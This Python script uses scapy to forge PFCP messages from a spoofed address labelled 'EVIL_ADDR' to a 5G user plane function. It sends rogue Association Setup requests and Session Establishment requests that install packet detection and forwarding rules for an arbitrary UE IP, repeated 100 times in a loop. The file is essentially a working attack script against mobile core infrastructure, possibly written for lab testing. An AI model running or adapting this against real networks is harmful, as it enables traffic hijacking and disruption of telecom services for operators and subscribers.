from scapy.all import send, IP, UDP
from scapy.contrib.pfcp import *
import time
EVIL_ADDR = "10.100.200.66" 
UPF_ADDR  = "10.100.200.2"
DEST_PORT = 8805
SRC_PORT = 8805
seq=1



def send_pfcp_association_setup_req():
    global seq
    

    node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=EVIL_ADDR)))
    recovery_timestamp = Raw(bytes(IE_RecoveryTimeStamp(
        timestamp=int(time.time())
    )))
    pfcp_msg = PFCP(
        version=1,
        message_type=5,
        seid=0,
        S=0,
        seq=seq
    )/node_id/recovery_timestamp

    packet = IP(src=EVIL_ADDR, dst=UPF_ADDR)/UDP(sport=8805, dport=8805)/pfcp_msg
    packet = packet.__class__(bytes(packet))
    print("PFCP Association Setup packet:", packet.show())
    send(packet)
    print(f"PFCP Association Setup packet sent")
    seq += 1

def send_pfcp_session_establishment_req():
    global seq
    
    seid = 0xC0FFEE
    teid = 0x11111111
    ue_ip = "1.1.1.1" # Random IP address
    network_instance = "internet"

    ie_nodeid = Raw(bytes(IE_NodeId(id_type=0, ipv4=EVIL_ADDR)))
    ie_fseid = Raw(bytes(IE_FSEID(seid=seid, v4=1, ipv4=EVIL_ADDR)))

    ie_createpdr = Raw(bytes(IE_CreatePDR(IE_list=[
        IE_PDR_Id(id=1),
        IE_Precedence(precedence=255),
        IE_PDI(IE_list=[
            IE_SourceInterface(interface=1),
            IE_NetworkInstance(instance=network_instance),
            IE_FTEID(TEID=teid, V4=1, ipv4=ue_ip)
        ]),
        IE_FAR_Id(id=1)
    ])))

    ie_createfar = Raw(bytes(IE_CreateFAR(IE_list=[
        IE_FAR_Id(id=1),
        IE_ApplyAction(FORW=1),
        IE_ForwardingParameters(IE_list=[
            IE_DestinationInterface(interface=1)
        ])
    ])))

    pfcp_msg = PFCP(
        version=1,
        message_type=50,
        seid=0,
        S=1,
        seq=seq
    ) / ie_nodeid / ie_fseid / ie_createpdr / ie_createfar

    pkt = IP(src=EVIL_ADDR, dst=UPF_ADDR) / UDP(sport=SRC_PORT, dport=DEST_PORT) / pfcp_msg
    pkt = pkt.__class__(bytes(pkt))  # Recalcul final

    print(f"Sending PFCP Session Establishment Request Test")
    pkt.show()
    send(pkt)
    print("Packet sent.")
    seq += 1



for x in range(100):
    send_pfcp_association_setup_req()
    time.sleep(0.1)
    send_pfcp_session_establishment_req()
    time.sleep(0.1)

    